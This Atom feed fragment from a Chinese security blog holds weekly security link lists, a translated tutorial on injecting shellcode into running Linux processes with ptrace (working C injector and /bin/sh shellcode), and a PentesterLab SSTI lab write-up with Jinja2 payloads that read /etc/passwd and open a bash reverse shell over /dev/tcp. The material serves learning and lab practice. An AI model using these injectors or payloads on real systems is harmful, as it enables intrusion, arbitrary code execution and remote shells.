<li>DCShadow - Active Directory 域控环境中的最新攻击方法<br><a href="https://blog.alsid.eu/dcshadow-explained-4510f52fc19d" target="_blank" rel="external">https://blog.alsid.eu/dcshadow-explained-4510f52fc19d</a></li>
<li>CloudFlair - 使用来自 Censys 的互联网扫描数据查找使用 CloudFlare 的网站的原始服务器的工具<br><a href="https://github.com/christophetd/CloudFlair" target="_blank" rel="external">https://github.com/christophetd/CloudFlair</a></li>
<li>lanGhost - 可通过 Telegram 控制的局域网后门<br><a href="https://github.com/xdavidhu/lanGhost" target="_blank" rel="external">https://github.com/xdavidhu/lanGhost</a></li>
<li>恐怖的 IoT 收割机 - Botnets 服务中的漏洞<br><a href="https://embedi.com/blog/grim-iot-reaper-1-and-0-day-vulnerabilities-at-the-service-of-botnets/" target="_blank" rel="external">https://embedi.com/blog/grim-iot-reaper-1-and-0-day-vulnerabilities-at-the-service-of-botnets/</a></li>
<li>prospector - 类似 Pylint 的 Python 代码分析工具<br><a href="https://github.com/landscapeio/prospector" target="_blank" rel="external">https://github.com/landscapeio/prospector</a></li>
<li>PHP源码调试之WINDOWS文件通配符分析<br><a href="http://avfisher.win/archives/888" target="_blank" rel="external">http://avfisher.win/archives/888</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Linux boot process 分析&lt;br&gt;&lt;a href=&quot;https://openso
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>linux进程注入(-)</title>
    <link href="http://kevien.github.io/2018/01/28/linux%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/"/>
    <id>http://kevien.github.io/2018/01/28/linux进程注入/</id>
    <published>2018-01-28T09:18:28.000Z</published>
    <updated>2018-01-28T10:01:59.000Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">译文声明</div><div class="line">本文是翻译文章，文章原作者0x00pf，文章来源：0x00sec.org</div><div class="line">原文地址：https://0x00sec.org/t/linux-infecting-running-processes/1097</div><div class="line">第一篇翻译的文章，如有不当，那也没有什么办法0.0</div><div class="line">主要是在工作中遇到了一个需要注入的场景就学习了一下。</div></pre></td></tr></table></figure>
<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul>
<li>我们已经知道了如何向一个二进制文件注入代码让程序在下次执行的时候执行我们的代码，但是如何向一个已在运行的进程中注入代码呢?这篇文章我将介绍如何去操作其它进程内存的一些基本技巧…换句话说，就是教你如何去写一个属于你自己的调试器。<h4 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h4></li>
<li>在去介绍技术细节之前，让我先来介绍几个需要注入代码到运行中进程的场景。</li>
<li>最初的场景并不是应用在恶意软件，而是应用在内存热补丁上面。运行的程序不能被关闭或者重启，或者说关闭或者重启需要很多的花销。因为这个原因，所以如何在不关闭进程或者不重启进程的情况下去给程序打补丁和更新是前几年一个比较热门的话题。</li>
<li>另外一个主要的应用场景就是调试器以及逆向工具的开发。例如radare2…通过这篇文章你将学习它们是如何工作的。</li>
<li>显然另外的一个主要原因还是恶意软件的发展，病毒、后门等等。我猜大多数的使用者都是这个原因。一个例子，你们很多人都知道meterpreter的进程注入功能，这个功能够让你运行你的payload在一个’无辜’的且正在运行的进程中。</li>
<li>如果你之前读过我的文章，你应该知道我将要讨论linux下的进程注入，基本的原理在不同的操作系统平台下是类似的，所以我希望即使你不是一个linuxer，这篇文章也会对你有用。就说这么多了，下面让我们来看具体细节吧。<h4 id="在linux中进行进程调试"><a href="#在linux中进行进程调试" class="headerlink" title="在linux中进行进程调试"></a>在linux中进行进程调试</h4></li>
<li>从技术上说，获取其它的进程并修改它一般是通过操作系统提供的调试接口来实现的，在linux中具有调试功能的工具有ptrace、Gdb、radare2、ddd、strace等，这些工具都是使用ptrace这个系统调用来提供服务的。</li>
<li>ptrace系统调用允许一个进程去调试另外一个进程，使用ptrace能够使我们停止一个目标进程的执行并且能够让我们去查看和修改目标进程中各个寄存器的值以及内存的值。</li>
<li>这里用两种方式去调试一个进程，第一种(也是最直接的一种)就是让我们的调试器去开启我们的进程…fork和exec，这种一般是传入被调试程序的名字参数给gdb或者strace。</li>
<li>另外一种就是我们需要去动态附加我们的调试器到运行的进程。</li>
<li>这篇文章我们主要关注第二种，当你对这些基本的知识点熟悉之后，后面在你调试程序的时候就不会有什么问题了。<h4 id="附加到正在运行的进程"><a href="#附加到正在运行的进程" class="headerlink" title="附加到正在运行的进程"></a>附加到正在运行的进程</h4></li>
<li>修改正在运行的进程之前我们首先做的是要调试它，这个过程被称为附加，这也是gdb的一个命令，让我们看下面的代码：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;stdint.h&gt;</div><div class="line"></div><div class="line">#include &lt;sys/ptrace.h&gt;</div><div class="line">#include &lt;sys/types.h&gt;</div><div class="line">#include &lt;sys/wait.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">#include &lt;sys/user.h&gt;</div><div class="line">#include &lt;sys/reg.h&gt;</div><div class="line"></div><div class="line">int</div><div class="line">main (int argc, char *argv[])</div><div class="line">&#123;</div><div class="line">  pid_t                   target;</div><div class="line">  struct user_regs_struct regs;</div><div class="line">  int                     syscall;</div><div class="line">  long                    dst;</div><div class="line"></div><div class="line">  if (argc != 2)</div><div class="line">    &#123;</div><div class="line">      fprintf (stderr, &quot;Usage:\n\t%s pid\n&quot;, argv[0]);</div><div class="line">      exit (1);</div><div class="line">    &#125;</div><div class="line">  target = atoi (argv[1]);</div><div class="line">  printf (&quot;+ Tracing process %d\n&quot;, target);</div><div class="line">  if ((ptrace (PTRACE_ATTACH, target, NULL, NULL)) &lt; 0)</div><div class="line">    &#123;</div><div class="line">      perror (&quot;ptrace(ATTACH):&quot;);</div><div class="line">      exit (1);</div><div class="line">    &#125;</div><div class="line">  printf (&quot;+ Waiting for process...\n&quot;);</div><div class="line">  wait (NULL);</div></pre></td></tr></table></figure>
<ul>
<li>在这段代码中我们可以看到main函数接收一个参数，这里是pid（进程id号），即我们想要去注入的进程。我们在后面的每次ptrace系统调用的时候都会用的到。</li>
<li>我们使用ptrace系统调用，第一个参数是PTRACE_ATTACH,第二个参数是我们想要附加的进程id，之后我们调用wait的SIGTRAP信号去判断附加进程是否完成。</li>
<li>这个时候，我们附加的进程停止，我们可以按照我们的意愿去修改它。<h4 id="注入代码"><a href="#注入代码" class="headerlink" title="注入代码"></a>注入代码</h4></li>
<li>首先我们需要知道我们要将我们的代码注入到哪里，这里有几种可能性：</li>
</ul>
<ol>
<li>我们可以插入到当前要执行的指令之后，这是最直接的方式但是会破坏原有的目标进程，会导致原来的目标进程的后续功能受到破坏。</li>
<li>我们可以尝试注入代码到main函数地址处，但是有一定的几率是某些初始化的操作是在程序执行之前，因此我们首先需要让程序的正常工作。</li>
<li>另外的选择是使用ELF注入技巧，注入我们的代码，例如在内存中寻找空隙。</li>
<li>最后，我们可以在栈中注入代码，同一般的栈溢出，这是一种安全的方式可以避免破坏原有程序的方式。</li>
</ol>
<ul>
<li>简单点儿，我们打算在控制了进程之后，在IP寄存器地址处注入我们的代码，后面的代码中可以看到，我们将直接注入一段典型的得到shell session的shellcode。因此我们也不期望交还控制权给原来的进程。换句话说，我们不在乎是否会破坏原有的进程。<h4 id="获取寄存器和内存信息"><a href="#获取寄存器和内存信息" class="headerlink" title="获取寄存器和内存信息"></a>获取寄存器和内存信息</h4></li>
<li><p>下面的代码注入我们的“恶意代码”到目标进程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">printf (&quot;+ Getting Registers\n&quot;);</div><div class="line">if ((ptrace (PTRACE_GETREGS, target, NULL, &amp;regs)) &lt; 0)</div><div class="line">  &#123;</div><div class="line">    perror (&quot;ptrace(GETREGS):&quot;);</div><div class="line">    exit (1);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">printf (&quot;+ Injecting shell code at %p\n&quot;, (void*)regs.rip);</div><div class="line">inject_data (target, shellcode, (void*)regs.rip, SHELLCODE_SIZE);</div><div class="line">regs.rip += 2;</div></pre></td></tr></table></figure>
</li>
<li><p>上面的代码中首先看到的是我们调用了ptrace,其中第一个参数是PTRACE_GETREGS,这将使我们的程序可以获取到被控制进程的寄存器内容。</p>
</li>
<li>之后，我们使用一个方法注入我们的shellcode到目标进程。注意我们获取了regs.rip(即目标进程当前的IP寄存器的值)，inject_data函数，如你所想，拷贝我们的shellcode到reg.rip所指向的内存地址处。</li>
<li><p>让我们看看是怎么样的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">inject_data (pid_t pid, unsigned char *src, void *dst, int len)</div><div class="line">&#123;</div><div class="line">  int      i;</div><div class="line">  uint32_t *s = (uint32_t *) src;</div><div class="line">  uint32_t *d = (uint32_t *) dst;</div><div class="line"></div><div class="line">  for (i = 0; i &lt; len; i+=4, s++, d++)</div><div class="line">    &#123;</div><div class="line">      if ((ptrace (PTRACE_POKETEXT, pid, d, *s)) &lt; 0)</div><div class="line">	&#123;</div><div class="line">	  perror (&quot;ptrace(POKETEXT):&quot;);</div><div class="line">	  return -1;</div><div class="line">	&#125;</div><div class="line">    &#125;</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>很简单是不是，在这个函数中只有两点是需要稍微解释说明的</p>
</li>
</ul>
<ol>
<li>PTRACE_POKETEXT 用来写入目标进程的内存中，这里就是我们真正注入我们的代码到目标进程，此外还有PTRACE_PEEKTEXT函数等.</li>
<li>PTRACE_POKETEXT 函数写入是以words为单位的，所以我们我们需要转换成word类型，还需要指针每次增加4。<h4 id="运行注入代码"><a href="#运行注入代码" class="headerlink" title="运行注入代码"></a>运行注入代码</h4></li>
</ol>
<ul>
<li><p>现在目标进程的内存已经被注入包含我们需要运行的代码了，现在要做的就是交回我们的控制权给目标进程并让它保持正常运行了。这里有几种不同的方法，这里我们需要做的是分离目标进程，因此，我们停止调试目标进程。下面的方法可以停止调试且让目标进程继续执行：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">  printf (&quot;+ Setting instruction pointer to %p\n&quot;, (void*)regs.rip);</div><div class="line">  if ((ptrace (PTRACE_SETREGS, target, NULL, &amp;regs)) &lt; 0)</div><div class="line">    &#123;</div><div class="line">      perror (&quot;ptrace(GETREGS):&quot;);</div><div class="line">      exit (1);</div><div class="line">    &#125;</div><div class="line">  printf (&quot;+ Run it!\n&quot;);</div><div class="line"> </div><div class="line">  if ((ptrace (PTRACE_DETACH, target, NULL, NULL)) &lt; 0)</div><div class="line">	&#123;</div><div class="line">	  perror (&quot;ptrace(DETACH):&quot;);</div><div class="line">	  exit (1);</div><div class="line">	&#125;</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>这里很容易理解，需要注意的是我们需要先把寄存器的值重新设回到以前，然后再去分离。回到前面的章节部分检查一下我们注入的代码…你注意到了在这里<br>为什么要regs.rip += 2了吗</p>
</li>
<li>是的，我们修改了IP寄存器的值，这也是为什么我们能够成功分离并将程序控制权交还给目标进程的原因所在。<h4 id="如何去算出这两个字节"><a href="#如何去算出这两个字节" class="headerlink" title="如何去算出这两个字节"></a>如何去算出这两个字节</h4></li>
<li>当我们调用PTRACE_DEATCH时候需要另外计算的两个字节并不那么容易去发现，我来告诉你们，来满足大家的好奇心。</li>
<li>在整个测试的过程中，当我尝试去注入代码的时候目标进程总是崩掉，一个原因是我的目标程序中栈数据不能执行，我通过execstack 工具去排除这个原因，但是程序还是会崩掉，所以我开启了内存dump分析了一下到底发生了什么。</li>
<li>原因是，你不能同时运行gdb去调试目标进程，否则第一个ptrace会失败，你不能用两个调试器在同一时间调试同一个程序（这句话隐藏了一个反调试的技巧;）,所以当我尝试栈溢出的方式注入代码的时候得到如下的信息：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">+ Tracing process 15333</div><div class="line">+ Waiting for process...</div><div class="line">+ Getting Registers</div><div class="line">+ Injecting shell code at 0x7ffe9a708728</div><div class="line">+ Setting instruction pointer to 0x7ffe9a708708</div><div class="line">+ Run it!</div></pre></td></tr></table></figure>
<ul>
<li>当然，这里的地址以及进程名在你的系统中可能不一样，然而，进程崩溃dump的内存可以通过gdb去检查到底发生了什么。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">$ gdb ./target core</div><div class="line">(... gdb start up messages removed ...)</div><div class="line">Reading symbols from ./target...(no debugging symbols found)...done.</div><div class="line">[New LWP 15333]</div><div class="line">Core was generated by `./target&apos;.</div><div class="line">Program terminated with signal SIGSEGV, Segmentation fault.</div><div class="line">#0  0x00007ffe9a708706 in ?? ()</div></pre></td></tr></table></figure>
<ul>
<li>可以看到这里发生了段地址错误，如果你对比了injector的输出信息可以发现这里有两字节的不同，修改这里将会使你注入成功。<h4 id="测试程序"><a href="#测试程序" class="headerlink" title="测试程序"></a>测试程序</h4></li>
<li>为了测试我写了个简单的程序，这个程序只是打印了它自己的pid(你就不用去找它的pid了)，然后每隔2s打印一个helloword，打印10次，这将会给你注入的时间。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;unistd.h&gt;</div><div class="line"></div><div class="line">int main()</div><div class="line">&#123;   </div><div class="line">    int i;</div><div class="line"></div><div class="line">    printf (&quot;PID: %d\n&quot;, (int)getpid());</div><div class="line">    for(i = 0;i &lt; 10; ++i) &#123;</div><div class="line"></div><div class="line">	write (1, &quot;Hello World\n&quot;, 12);</div><div class="line">        sleep(2);</div><div class="line">    &#125;</div><div class="line">    getchar();</div><div class="line">    return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<ul>
<li>我所用到的shellcode是通过如下的汇编文件生成的：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">section .text</div><div class="line">        global _start</div><div class="line"></div><div class="line">_start:</div><div class="line">        xor rax,rax</div><div class="line">        mov rdx,rax             ; No Env</div><div class="line">        mov rsi,rax             ; No argv</div><div class="line">        lea rdi, [rel msg]</div><div class="line"></div><div class="line">        add al, 0x3b</div><div class="line"></div><div class="line">        syscall</div><div class="line">        msg db &apos;/bin/sh&apos;,0</div></pre></td></tr></table></figure>
<h4 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h4><ul>
<li>ptrace是一个非常强大的工具，这篇文章中我们只是用到了最基本的，现在时候打开你的terminal然后输入man ptrace去学习一下它是如何的神奇了。</li>
<li>如果你有兴趣的话，你还可以进行如下的尝试：</li>
<li>1.修改注入代码到代码空隙</li>
<li>2.使用更加好用的shellcode让它另起一个进程，从而保持原程序正常运行</li>
<li>3.你的shellcode将会运行在目标项目中并且可以读取打开的文件…</li>
<li>一如往常，你可以github上找到文章中所涉及到的代码<br><a href="https://github.com/0x00pf/0x00sec_code/tree/master/mem_inject" target="_blank" rel="external">https://github.com/0x00pf/0x00sec_code/tree/master/mem_inject</a><h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4></li>
<li>附上译者的测试截图<br><img src="/2018/01/28/linux进程注入/testinject.png" alt=""></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/di
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20180122安全动态</title>
    <link href="http://kevien.github.io/2018/01/22/20180122%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2018/01/22/20180122安全动态/</id>
    <published>2018-01-22T04:32:58.000Z</published>
    <updated>2018-01-26T15:11:14.080Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>钓鱼邮件恶意文档制作技巧<br><a href="http://www.rvrsh3ll.net/blog/phishing/phishing-for-access/" target="_blank" rel="external">http://www.rvrsh3ll.net/blog/phishing/phishing-for-access/</a></li>
<li>一份关于 OSX 和 iOS 的安全资源集合<br><a href="https://github.com/kai5263499/osx-security-awesome" target="_blank" rel="external">https://github.com/kai5263499/osx-security-awesome</a></li>
<li>渗透技巧——利用tscon实现未授权登录远程桌面<br><a href="http://www.4hou.com/penetration/10015.html" target="_blank" rel="external">http://www.4hou.com/penetration/10015.html</a></li>
<li>Java RASP浅析——以百度OpenRASP为例<br><a href="https://paper.seebug.org/513/" target="_blank" rel="external">https://paper.seebug.org/513/</a></li>
<li>Electron &lt; v1.8.2-beta.4 远程命令执行漏洞—CVE-2018-1000006<br><a href="https://xianzhi.aliyun.com/forum/topic/1990" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/topic/1990</a></li>
<li><p>语音识别中的定向攻击 - 克隆一段音频，只修改我们指定的词<br><a href="https://arxiv.org/pdf/1801.01944.pdf" target="_blank" rel="external">https://arxiv.org/pdf/1801.01944.pdf</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">那以后的语音还能当做证据吗？！</div></pre></td></tr></table></figure>
</li>
<li><p>《Cracking Codes with Python》Python 密码算法破解书籍<br><a href="http://inventwithpython.com/cracking/" target="_blank" rel="external">http://inventwithpython.com/cracking/</a></p>
</li>
<li>Trojanize - 基于 WinRAR (SFX) 实现的木马植入工具，可以用这个工具生成一个内嵌木马的自解压文件<br><a href="https://github.com/r00t-3xp10it/trojanizer" target="_blank" rel="external">https://github.com/r00t-3xp10it/trojanizer</a></li>
<li>将最近泄露的 Exploit.in 和 Leakbase 密码库放到 ELK 中搜索<br><a href="https://outflank.nl/blog/2018/01/23/public-password-dumps-in-elk/" target="_blank" rel="external">https://outflank.nl/blog/2018/01/23/public-password-dumps-in-elk/</a></li>
<li>ProcInfo - macOS 上用于监视进程的开源库<br><a href="https://github.com/objective-see/ProcInfoc" target="_blank" rel="external">https://github.com/objective-see/ProcInfoc</a></li>
<li>FakeImageExploiter - 伪造图片实现漏洞利用的工具<br><a href="https://github.com/r00t-3xp10it/FakeImageExploiter" target="_blank" rel="external">https://github.com/r00t-3xp10it/FakeImageExploiter</a></li>
<li>PHP CVE-2018-5711 - Hanging Websites by a Harmful GIF，一个 GIF 图片宕掉你的服务器<br><a href="http://blog.orange.tw/2018/01/php-cve-2018-5711-hanging-websites-by.html" target="_blank" rel="external">http://blog.orange.tw/2018/01/php-cve-2018-5711-hanging-websites-by.html</a></li>
<li>一篇文章走进Mac逆向的世界<br><a href="http://www.alonemonkey.com/2017/05/31/get-start-with-mac-reverse/" target="_blank" rel="external">http://www.alonemonkey.com/2017/05/31/get-start-with-mac-reverse/</a></li>
<li>Exploit 编写方面的资料整理<br><a href="https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Exploit%20Development.md" target="_blank" rel="external">https://github.com/rmusser01/Infosec_Reference/blob/master/Draft/Exploit%20Development.md</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;每周安全动态&quot;&gt;&lt;a href=&quot;#每周安全动态&quot; class=&quot;headerlink&quot; title=&quot;每周安全动态&quot;&gt;&lt;/a&gt;每周安全动态&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;钓鱼邮件恶意文档制作技巧&lt;br&gt;&lt;a href=&quot;http://www.rvrsh3ll.net
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>从一道pentesterlab的题目说起</title>
    <link href="http://kevien.github.io/2018/01/16/%E4%BB%8E%E4%B8%80%E9%81%93pentesterlab%E7%9A%84%E9%A2%98%E7%9B%AE%E8%AF%B4%E8%B5%B7/"/>
    <id>http://kevien.github.io/2018/01/16/从一道pentesterlab的题目说起/</id>
    <published>2018-01-16T14:04:50.000Z</published>
    <updated>2018-01-18T12:36:41.855Z</updated>
    
    <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
<li>这个要得从前几天朋友丢过来的一个链接说起，是一道SSTI(Server Side Template Injection)的题目,目标是要执行任意命令，之前也没分析过SSTI的漏洞，所以简单看了下没搞定,后来有其它的事情就没看，这两天又看了下，觉得还是挺有意思的，就记录一下。<h4 id="method1"><a href="#method1" class="headerlink" title="method1"></a>method1</h4></li>
<li>SSTI原理就不讲了，不是这篇文章的重点，想要了解可以参考Reference中的链接。<br>这个题目和Reference文章基本是一样的。</li>
<li><p>读文件就不解释了 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40]</div><div class="line">(&apos;/etc/passwd&apos;).read() &#125;&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>这里是通过file.read()方法直接读文件，然后直接显示在页面上的。但是如何实现命令执行反弹shell呢?</p>
</li>
<li>通过列举当前object下的子类可以发现有subprocess的Popen类，大家应该知道Popen是直接可以执行命令的，要索引类Popen，使用index不行（原因不明），但也可以通过笨方法自己索引<br><img src="/2018/01/16/从一道pentesterlab的题目说起/subprocess.png" alt=""></li>
<li><img src="/2018/01/16/从一道pentesterlab的题目说起/indexpopen.png" alt=""></li>
<li>索引233，后面就可以执行命令了，但是不能回显，所以可以把我们的命令执行后结果写入到文件，然后再通过读文件读出来。<br><img src="/2018/01/16/从一道pentesterlab的题目说起/writecommand.png" alt=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()</div><div class="line">[233](&quot;id &gt;/tmp/M0rk.txt&quot;,shell=True) &#125;&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="/2018/01/16/从一道pentesterlab的题目说起/readfile.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40]</div><div class="line">(&apos;/tmp/M0rk.txt&apos;).read() &#125;&#125;</div></pre></td></tr></table></figure></p>
<ul>
<li>那能不能拿到shell呢？答案是肯定的.<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()</div><div class="line">[233](&apos;&apos;&apos;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1&quot;&apos;&apos;&apos;,shell=True) &#125;&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<p><img src="/2018/01/16/从一道pentesterlab的题目说起/shell.png" alt=""></p>
<h4 id="method2"><a href="#method2" class="headerlink" title="method2"></a>method2</h4><ul>
<li>今天又仔细研究了一下，发现了一种不依赖mro（Method Resolution Order）的方法。<br><img src="/2018/01/16/从一道pentesterlab的题目说起/indexsystem.png" alt=""></li>
<li><p>一步一步找到os.system的索引为138</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; [].__class__.__base__.__subclasses__()[59]</div><div class="line">.__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].__dict__.keys().index(&apos;system&apos;) &#125;&#125;</div></pre></td></tr></table></figure>
</li>
<li><p>同样可以拿到shell<br><img src="/2018/01/16/从一道pentesterlab的题目说起/shell2.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://ptl-17ec4297-24d9093a.libcurl.so/&#123;&#123; [].__class__.__base__.__subclasses__()[59]</div><div class="line">.__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].__dict__.values()[138]</div><div class="line">(&apos;&apos;&apos;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/ip/2333 0&gt;&amp;1&quot;&apos;&apos;&apos;) &#125;&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="other"><a href="#other" class="headerlink" title="other"></a>other</h4><ul>
<li>本来想写个长篇文章介绍SSTI原理以及python沙箱绕过原理的，后来发现无非还是翻译英文原著的文章，所以想了解原理的直接去看英文原版文章就好，0.0<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
<li><a href="https://www.lanmaster53.com/2016/03/exploring-ssti-flask-jinja2/" target="_blank" rel="external">Exploring SSTI in Flask/Jinja2</a></li>
<li><a href="https://www.lanmaster53.com/2016/03/11/exploring-ssti-flask-jinja2-part-2/" target="_blank" rel="external">Exploring SSTI in Flask/Jinja2 - Part 2</a></li>
<li><a href="https://hexplo.it/escaping-the-csawctf-python-sandbox/" target="_blank" rel="external">CSAW-CTF Python sandbox write-up</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;这个要得从前几天朋友丢过来的一个链接说起，是一道SSTI(Server Side Template In
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>20180115安全动态</title>
    <link href="http://kevien.github.io/2018/01/15/20180115%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
    <id>http://kevien.github.io/2018/01/15/20180115安全动态/</id>
    <published>2018-01-15T03:03:42.000Z</published>
    <updated>2018-01-19T10:57:08.477Z</updated>
    
    <content type="html"><![CDATA[<h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
<li>RPO攻击技术浅析<br><a href="http://blog.nsfocus.net/rpo-attack/" target="_blank" rel="external">http://blog.nsfocus.net/rpo-attack/</a></li>
<li>挖洞经验 | 看我如何发现D-Link 815N路由器的RCE 0-day漏洞<br><a href="http://www.freebuf.com/vuls/160181.html" target="_blank" rel="external">http://www.freebuf.com/vuls/160181.html</a></li>
<li>linux-inject：注入代码到运行的Linux进程中<br><a href="http://blog.csdn.net/hpp24/article/details/52125568" target="_blank" rel="external">http://blog.csdn.net/hpp24/article/details/52125568</a></li>
